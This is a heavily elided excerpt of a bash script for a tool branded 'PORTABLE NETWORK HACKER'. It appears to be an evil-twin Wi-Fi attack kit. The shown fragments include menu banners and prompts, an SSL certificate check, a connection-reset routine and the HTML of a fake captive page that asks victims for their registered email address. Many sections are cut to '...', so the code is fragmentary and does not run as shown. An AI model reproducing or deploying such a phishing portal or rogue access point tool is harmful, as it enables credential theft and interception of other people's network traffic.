...
<< comment
general_exitmode_8="Thanks for using PORTABLE NETWORK HACKER"
comment
#############################################################################################
...
function top(){
        ...
        echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
        echo -e "$red[                                                      ]"
  echo -e "$red[  $red        PORTABLE ${blue}NETWORK ${red}HACKER "  ${blue}"                   ]          "
        echo -e "$blue[                                                      ]"
        ...
        if [ "$INTERFACESNUMBER" -gt "0" ]; then
                ...
                if [ "$INTERFACESNUMBER" -eq "1" ]; then
                        ...
                        if [ "$FLUX_AUTO" = "1" ];then
                                ...
                                echo
                                echo -n -e ""$red"["$blue"PVA"$yellow"@"$white""$red"]-["$yellow"~"$red"]"$transparent""
                                read line
                        fi
        ...
        if [ "$FLUX_AUTO" = "1" ];then
         ...
         conditional_clear
                while true; do
                        ...
                        echo -e ""$red"["$yellow"1"$red"]"$transparent" $header_choosescan"
                        echo "                                       "
        ...
        if [ "$FLUX_AUTO" = "1" ];then
                ...
                while true; do
                       ...
                       # echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
                        echo -e "      "$red"["$yellow"2"$red"]"$red" $general_back" $transparent
                        echo "                                       "
                        echo -n -e ""$red"["$blue"PVA"$yellow"@"$white""$red"]-["$yellow"~"$red"]"$transparent""
                        read yn
                        echo ""
...
function askauth {
        ...
        if [ "$FLUX_AUTO" = "1" ];then
                ...
                while true; do
                        ...
                        echo -e ""$red"["$yellow""$red"]"$transparent" $header_askauth"
                        echo "                                       "
...
# Test if the ssl certificate is generated correcly if there is any
        ...
        if [ -f $DUMP_PATH/server.pem ]; then
                if [ -s $DUMP_PATH/server.pem ]; then
                        ...
                        echo -e "      "$red"["$yellow"2"$red"]"$red" Exit" $transparent
                        echo " "
                        echo -n '      #> '
                        read yn
...
function ConnectionRESET {
        ...
        if [ "$FLUX_AUTO" = "1" ];then
                ...
                while true; do
                        ...
                        echo
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent" English     [ENG]  ";n=`expr $n + 1`
        ...
        <body>
            ...
            <div data-role=\"page\" data-theme=\"a\">
                        <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
							...
							<label for=\"key1\">Enter Registered Email Id:</label>
                                                        <input id=\"key2\" data-clear-btn=\"true\" type=\"email\" value=\"\" name=\"key2\" maxlength=\"64\"/>
